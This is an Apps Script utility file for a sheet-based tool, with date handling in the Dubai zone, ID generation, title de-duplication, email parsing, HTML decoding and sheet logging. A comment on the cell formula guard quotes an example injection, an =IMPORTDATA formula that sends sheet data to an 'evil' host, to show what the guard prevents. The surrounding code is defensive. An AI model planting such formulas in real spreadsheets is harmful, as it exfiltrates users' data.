/**
 * Util.gs — dates (Dubai), text normalisation, similarity, id generation, logging.
 *
 * Loaded second (see .clasp.json filePushOrder). No service calls at load time.
 */

const DATE_RE_ = /^(\d{4})-(\d{2})-(\d{2})(?:[T ](\d{2}):(\d{2})(?::(\d{2})(?:\.(\d{1,3}))?)?)?\s*(Z|[+-]\d{2}:?\d{2})?$/;
const WEEKDAY_NAMES_ = ['monday', 'tuesday', 'wednesday', 'thursday', 'friday', 'saturday', 'sunday'];

/** Realm-safe Date check (works for Date subclasses and Dates from another context). */
function isDateValue(v) {
  return Object.prototype.toString.call(v) === '[object Date]';
}

/** Time zone from Config (falls back to the TIMEZONE constant). */
function getTimeZone() {
  try {
    const tz = readConfig().TIMEZONE;
    return tz || TIMEZONE;
  } catch (e) {
    return TIMEZONE;
  }
}

/** Today's local date as yyyy-MM-dd. `now` is optional (tests). */
function todayDubai(now) {
  return Utilities.formatDate(isDateValue(now) ? now : new Date(), getTimeZone(), 'yyyy-MM-dd');
}

/** Current instant as ISO 8601 with the local offset. */
function nowIso(now) {
  return formatDateTime(isDateValue(now) ? now : new Date());
}

/** Formats a Date (or a date string) in the local zone. Blank/invalid → ''. */
function formatDate(value, pattern) {
  const d = isDateValue(value) ? value : parseDate(value);
  if (!(isDateValue(d)) || isNaN(d.getTime())) return '';
  return Utilities.formatDate(d, getTimeZone(), pattern || 'yyyy-MM-dd');
}

/** ISO 8601 datetime with offset, e.g. 2026-10-10T06:40:12+04:00. */
function formatDateTime(value) {
  return formatDate(value, "yyyy-MM-dd'T'HH:mm:ssXXX");
}

/**
 * Parses yyyy-MM-dd (midnight in the local zone), yyyy-MM-dd HH:mm[:ss], ISO 8601
 * with offset, or a Date. Returns a Date or null.
 */
function parseDate(value) {
  if (isDateValue(value)) return isNaN(value.getTime()) ? null : value;
  if (value === null || value === undefined) return null;
  if (typeof value === 'number' && isFinite(value)) return new Date(value);
  const s = String(value).trim();
  if (!s) return null;
  const m = DATE_RE_.exec(s);
  if (!m) {
    const t = Date.parse(s);
    return isNaN(t) ? null : new Date(t);
  }
  const y = Number(m[1]);
  const mo = Number(m[2]);
  const d = Number(m[3]);
  const hh = Number(m[4] || 0);
  const mi = Number(m[5] || 0);
  const ss = Number(m[6] || 0);
  const ms = Number((m[7] || '0').padEnd(3, '0'));
  if (mo < 1 || mo > 12 || d < 1 || d > 31 || hh > 23 || mi > 59 || ss > 59) return null;
  const naive = Date.UTC(y, mo - 1, d, hh, mi, ss, ms);
  // Reject impossible calendar dates (2026-02-30, 2026-04-31) instead of letting Date.UTC roll them forward.
  const check = new Date(naive);
  if (check.getUTCFullYear() !== y || check.getUTCMonth() !== mo - 1 || check.getUTCDate() !== d) return null;
  if (m[8]) {
    if (m[8] === 'Z') return new Date(naive);
    const sign = m[8][0] === '-' ? -1 : 1;
    const digits = m[8].slice(1).replace(':', '');
    const offMin = sign * (Number(digits.slice(0, 2)) * 60 + Number(digits.slice(2, 4)));
    return new Date(naive - offMin * 60000);
  }
  // Interpret as local time in the configured zone: shift by the zone offset at that instant.
  const guess = new Date(naive);
  const off1 = zoneOffsetMinutes_(guess);
  let result = new Date(naive - off1 * 60000);
  const off2 = zoneOffsetMinutes_(result);
  if (off2 !== off1) result = new Date(naive - off2 * 60000);
  return result;
}

/** Zone offset in minutes east of UTC at the given instant (+240 for Dubai). */
function zoneOffsetMinutes_(date) {
  const z = Utilities.formatDate(date, getTimeZone(), 'Z'); // e.g. +0400
  const sign = z[0] === '-' ? -1 : 1;
  return sign * (Number(z.slice(1, 3)) * 60 + Number(z.slice(3, 5)));
}

/** Is `s` a valid yyyy-MM-dd string? */
function isDateString(s) {
  if (typeof s !== 'string' || !/^\d{4}-\d{2}-\d{2}$/.test(s)) return false;
  const p = s.split('-').map(Number);
  const d = new Date(Date.UTC(p[0], p[1] - 1, p[2]));
  return d.getUTCFullYear() === p[0] && d.getUTCMonth() === p[1] - 1 && d.getUTCDate() === p[2];
}

/** Returns a yyyy-MM-dd string for a date-like value, or ''. */
function toDateString(value) {
  if (value === null || value === undefined || value === '') return '';
  if (typeof value === 'string') {
    const s = value.trim();
    if (isDateString(s)) return s;
    // A yyyy-MM-dd string that is not a real calendar date is invalid, never rolled forward.
    if (/^\d{4}-\d{2}-\d{2}$/.test(s)) return '';
    if (/^\d{4}-\d{2}-\d{2}[T ]/.test(s) && isDateString(s.slice(0, 10)) && !/(Z|[+-]\d{2}:?\d{2})$/.test(s)) return s.slice(0, 10);
  }
  return formatDate(value, 'yyyy-MM-dd');
}

/** Returns an ISO datetime string for a datetime-like value, or ''. */
function toDateTimeString(value) {
  if (value === null || value === undefined || value === '') return '';
  return formatDateTime(value);
}

/** Pure calendar arithmetic on yyyy-MM-dd strings (no time zone involved). */
function addDays(dateStr, n) {
  const s = toDateString(dateStr);
  if (!s) return '';
  const p = s.split('-').map(Number);
  const d = new Date(Date.UTC(p[0], p[1] - 1, p[2] + Number(n || 0)));
  return d.getUTCFullYear() + '-' + pad2_(d.getUTCMonth() + 1) + '-' + pad2_(d.getUTCDate());
}

/** Whole days from a to b (b − a) for yyyy-MM-dd strings. */
function daysBetween(a, b) {
  const pa = toDateString(a).split('-').map(Number);
  const pb = toDateString(b).split('-').map(Number);
  if (pa.length !== 3 || pb.length !== 3 || isNaN(pa[0]) || isNaN(pb[0])) return NaN;
  return Math.round((Date.UTC(pb[0], pb[1] - 1, pb[2]) - Date.UTC(pa[0], pa[1] - 1, pa[2])) / 86400000);
}

/** ISO weekday 1 (Monday) … 7 (Sunday) for a yyyy-MM-dd string. */
function isoWeekday(dateStr) {
  const p = toDateString(dateStr).split('-').map(Number);
  const day = new Date(Date.UTC(p[0], p[1] - 1, p[2])).getUTCDay(); // 0 = Sunday
  return day === 0 ? 7 : day;
}

/** Monday of the week containing dateStr. */
function mondayOf(dateStr) {
  return addDays(dateStr, -(isoWeekday(dateStr) - 1));
}

/** Weekday name or number → ISO weekday number (default Tuesday). */
function weekdayNumber(name) {
  if (typeof name === 'number' && name >= 1 && name <= 7) return name;
  const s = String(name || '').trim().toLowerCase();
  if (/^[1-7]$/.test(s)) return Number(s);
  const idx = WEEKDAY_NAMES_.findIndex((n) => s && n.indexOf(s.slice(0, 3)) === 0);
  return idx >= 0 ? idx + 1 : 2;
}

/** Next date on or after `fromDate` whose weekday is `meetingDay` (name or 1–7). */
function nextMeetingDate(fromDate, meetingDay) {
  const start = toDateString(fromDate) || todayDubai();
  const want = weekdayNumber(meetingDay);
  const have = isoWeekday(start);
  const delta = (want - have + 7) % 7;
  return addDays(start, delta);
}

function pad2_(n) {
  return (n < 10 ? '0' : '') + n;
}

/** Date object at local midnight for a yyyy-MM-dd string, or '' for blank (for writing to cells). */
function dateCell(dateStr) {
  const s = toDateString(dateStr);
  if (!s) return '';
  return parseDate(s);
}

// ---------------------------------------------------------------------------
// IDs
// ---------------------------------------------------------------------------

/**
 * New id `<prefix>-xxxxxxxx` (8 lowercase base36 chars from Date.now() and random).
 * `existingIds` may be a Set, an array, an object or nothing. Regenerates on collision.
 */
function newId(prefix, existingIds) {
  const p = String(prefix || '').replace(/-+$/, '');
  const has = idSetHas_(existingIds);
  for (let attempt = 0; attempt < 100; attempt++) {
    const t = Date.now().toString(36);
    const r = Math.random().toString(36).slice(2) + Math.random().toString(36).slice(2);
    const body = (t.slice(-3) + r).replace(/[^a-z0-9]/g, '').slice(0, 8);
    if (body.length !== 8) continue;
    const id = p + '-' + body;
    if (!has(id)) return id;
  }
  throw new Error('Could not generate a unique id');
}

function idSetHas_(existing) {
  if (!existing) return () => false;
  if (existing instanceof Set) return (id) => existing.has(id);
  if (Array.isArray(existing)) return (id) => existing.includes(id);
  if (typeof existing === 'object') return (id) => Object.prototype.hasOwnProperty.call(existing, id);
  return () => false;
}

// ---------------------------------------------------------------------------
// Text
// ---------------------------------------------------------------------------

/** Safe string of a cell value ('' for null/undefined). */
function str(v) {
  if (v === null || v === undefined) return '';
  if (isDateValue(v)) return formatDateTime(v);
  return String(v);
}

/** Collapses whitespace and trims. */
function collapseWhitespace(s) {
  return str(s).replace(/\s+/g, ' ').trim();
}

function truncate(s, max) {
  const t = str(s);
  return t.length > max ? t.slice(0, max) : t;
}

function escapeRegExp(s) {
  return String(s).replace(/[.*+?^${}()|[\]\\]/g, '\\$&');
}

/** Lowercase, drop leading re:/fwd:/fw:, strip punctuation, collapse whitespace. */
function normaliseTitle(s) {
  let t = str(s).toLowerCase();
  let prev = null;
  while (prev !== t) {
    prev = t;
    t = t.replace(/^\s*(re|fwd|fw)\s*:\s*/i, '');
  }
  t = t.replace(/[^\p{L}\p{N}\s]/gu, ' ');
  return t.replace(/\s+/g, ' ').trim();
}

function titleWords_(s) {
  const n = normaliseTitle(s);
  return n ? n.split(' ') : [];
}

/** Dice coefficient of the two titles' word sets (0..1). */
function diceSimilarity(a, b) {
  const wa = new Set(titleWords_(a));
  const wb = new Set(titleWords_(b));
  if (wa.size === 0 && wb.size === 0) return 1;
  if (wa.size === 0 || wb.size === 0) return 0;
  let inter = 0;
  wa.forEach((w) => { if (wb.has(w)) inter++; });
  return (2 * inter) / (wa.size + wb.size);
}

/** Duplicate titles: normalised equal, or Dice ≥ 0.8 with ≥ 3 words each. */
function isSimilarTitle(a, b) {
  const na = normaliseTitle(a);
  const nb = normaliseTitle(b);
  if (!na || !nb) return false;
  if (na === nb) return true;
  const wa = na.split(' ');
  const wb = nb.split(' ');
  if (wa.length < 3 || wb.length < 3) return false;
  return diceSimilarity(na, nb) >= 0.8;
}

/** Hex SHA-1 of a UTF-8 string. */
function sha1Hex(s) {
  const bytes = Utilities.computeDigest(Utilities.DigestAlgorithm.SHA_1, String(s), Utilities.Charset.UTF_8);
  return bytes.map((b) => ((b + 256) % 256).toString(16).padStart(2, '0')).join('');
}

/**
 * True when `text` contains any keyword as a whole word; multi-word keywords match
 * as phrases (any whitespace between words). Case-insensitive.
 */
function keywordHit(text, keywords) {
  return !!matchedKeyword(text, keywords);
}

/** The first keyword that hits, or ''. */
function matchedKeyword(text, keywords) {
  const hay = ' ' + str(text).toLowerCase().replace(/\s+/g, ' ') + ' ';
  const list = Array.isArray(keywords) ? keywords : String(keywords || '').split(',');
  for (let i = 0; i < list.length; i++) {
    const kw = str(list[i]).trim().toLowerCase();
    if (!kw) continue;
    const pattern = kw.split(/\s+/).map(escapeRegExp).join('\\s+');
    const re = new RegExp('(^|[^\\p{L}\\p{N}])' + pattern + '(?=$|[^\\p{L}\\p{N}])', 'u');
    if (re.test(hay)) return list[i];
  }
  return '';
}

/** Bare lower-cased address from "Name <addr>" or "addr". */
function extractEmail(fromHeader) {
  const s = str(fromHeader);
  const m = /<([^<>]+)>/.exec(s);
  const candidate = m ? m[1] : s;
  const m2 = /[A-Za-z0-9._%+\-']+@[A-Za-z0-9.\-]+\.[A-Za-z]{2,}/.exec(candidate);
  return (m2 ? m2[0] : candidate).trim().toLowerCase();
}

/** Display name part of "Name <addr>", or '' when there is none. */
function extractDisplayName(fromHeader) {
  const s = str(fromHeader).trim();
  const m = /^"?([^"<]*?)"?\s*<[^<>]+>$/.exec(s);
  return m ? m[1].trim() : '';
}

/**
 * Removes quoted replies from a plain-text body: everything from a line like
 * "On … wrote:" (or Outlook's "-----Original Message-----" / "From: … Sent:" block)
 * onwards, plus any line starting with ">".
 */
function stripQuotedReply(body) {
  let text = str(body).replace(/\r\n?/g, '\n');
  const markers = [
    /^\s*On\b[^\n]{0,200}(?:\n[^\n]{0,200}){0,2}?wrote:\s*$/m,
    /^\s*-{2,}\s*Original Message\s*-{2,}\s*$/mi,
    /^\s*-{2,}\s*Forwarded message\s*-{2,}\s*$/mi,
    /^\s*From:\s[^\n]+\n\s*(?:Sent|Date):\s[^\n]+\n/m,
    /^\s*_{5,}\s*$/m
  ];
  let cut = text.length;
  markers.forEach((re) => {
    const m = re.exec(text);
    if (m && m.index < cut) cut = m.index;
  });
  text = text.slice(0, cut);
  return text.split('\n').filter((line) => !/^\s*>/.test(line)).join('\n').trim();
}

/** Plain-text snippet: whitespace collapsed, cut to `max` (default 400). */
function cleanSnippet(text, max) {
  return truncate(collapseWhitespace(text), max || SNIPPET_MAX);
}

/**
 * Formula guard for sheet cells. Range.setValue(s) and Sheet.appendRow interpret a string
 * that begins with "=" as a formula, so a mail subject or Chat message such as
 * =IMPORTDATA("https://evil/?d="&ENCODEURL(JOIN(",",Work!C2:C500))) would become a live
 * formula in Brandon's sheet. Every string on its way into a cell passes through here and
 * gets a leading space (the convention the client export uses too); unguardCell() takes it
 * off again on read.
 */
function guardCell(v) {
  return typeof v === 'string' && v.charAt(0) === '=' ? ' ' + v : v;
}

/** Inverse of guardCell for values read back from a cell. */
function unguardCell(v) {
  return typeof v === 'string' && v.charAt(0) === ' ' && v.charAt(1) === '=' ? v.slice(1) : v;
}

/** Only http/https links survive; everything else becomes ''. */
function sanitiseLink(url) {
  const s = str(url).trim();
  const lower = s.toLowerCase();
  if (lower.indexOf('https://') === 0 || lower.indexOf('http://') === 0) {
    return s.replace(/[\s<>"']/g, '');
  }
  return '';
}

/** Decodes the common HTML entities (named, decimal and hex). */
function decodeEntities(s) {
  const named = { amp: '&', lt: '<', gt: '>', quot: '"', apos: "'", nbsp: ' ', ndash: '–', mdash: '—',
    hellip: '…', rsquo: '’', lsquo: '‘', rdquo: '”', ldquo: '“', copy: '©', bull: '•' };
  return str(s).replace(/&(#x[0-9a-fA-F]+|#\d+|[a-zA-Z]+);/g, (whole, body) => {
    if (body[0] === '#') {
      const code = body[1] === 'x' || body[1] === 'X' ? parseInt(body.slice(2), 16) : parseInt(body.slice(1), 10);
      return isFinite(code) && code > 0 && code < 0x110000 ? String.fromCodePoint(code) : whole;
    }
    const key = body.toLowerCase();
    return Object.prototype.hasOwnProperty.call(named, key) ? named[key] : whole;
  }).replace(/&amp;/g, '&');
}

// ---------------------------------------------------------------------------
// Errors
// ---------------------------------------------------------------------------

/** An error whose message is safe to show in the UI. */
function userError(message) {
  const err = new Error(String(message));
  err.isUserError = true;
  return err;
}

// ---------------------------------------------------------------------------
// Logging
// ---------------------------------------------------------------------------

/**
 * Appends a row to the Log tab (Time / Function / Level / Message) and mirrors it to
 * Logger. Trims the tab to the newest LOG_KEEP rows once it exceeds LOG_TRIM_AT. Never throws.
 *
 * Public (google.script.run can reach it), so it runs guard() first and writes nothing for
 * a caller outside ALLOWED_EMAILS. The two places that must log while guard() cannot pass
 * or is still running (apiCall_'s rejection row, readConfig's TIMEZONE warning) call log_.
 */
function log(fn, level, message) {
  try {
    guard();
  } catch (e) {
    return;
  }
  log_(fn, level, message);
}

function log_(fn, level, message) {
  const lvl = LOG_LEVELS.includes(String(level).toUpperCase()) ? String(level).toUpperCase() : 'INFO';
  const msg = truncate(str(message), 5000);
  try {
    Logger.log('[' + lvl + '] ' + fn + ': ' + msg);
  } catch (e) {
    // ignore
  }
  try {
    withLock(() => {
      const sheet = getTab(TABS.LOG);
      sheet.appendRow([new Date(), guardCell(String(fn || '')), lvl, guardCell(msg)]);
      const last = sheet.getLastRow();
      if (last - 1 > LOG_TRIM_AT) {
        sheet.deleteRows(2, last - 1 - LOG_KEEP);
      }
    });
  } catch (e) {
    try { Logger.log('log() failed: ' + (e && e.message ? e.message : e)); } catch (e2) { /* ignore */ }
  }
}

/** Cell equality for diffing a row against the sheet: Dates by instant, blanks of any kind alike. */
function cellEquals_(a, b) {
  const na = a === undefined || a === null ? '' : a;
  const nb = b === undefined || b === null ? '' : b;
  if (isDateValue(na) || isDateValue(nb)) return isDateValue(na) && isDateValue(nb) && na.getTime() === nb.getTime();
  return na === nb;
}

/** Short, single-line message for an error. */
function errorMessage(e) {
  if (!e) return 'Unknown error';
  const m = e.message ? String(e.message) : String(e);
  return truncate(collapseWhitespace(m), 200);
}
